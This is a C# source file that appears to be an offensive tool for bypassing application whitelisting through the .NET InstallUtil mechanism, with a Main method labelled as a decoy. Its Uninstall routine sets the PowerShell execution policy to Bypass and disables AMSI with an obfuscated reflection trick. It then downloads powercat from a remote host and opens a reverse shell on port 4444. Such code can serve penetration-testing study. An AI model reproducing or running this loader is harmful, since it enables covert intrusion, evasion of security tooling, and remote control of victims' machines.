using System;
using System.IO;
using System.Text;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CInstaller
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            // Set Execution Policy
            ps.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass");

            // Disable AMSI
            ps.AddScript("[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)");

            // "Interactive" Shell
            ps.AddScript("IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.193/powercat.ps1');powercat -c 192.168.45.193 -p 4444 -e powershell.exe");

            ps.Invoke();
            rs.Close();
        }
    }

}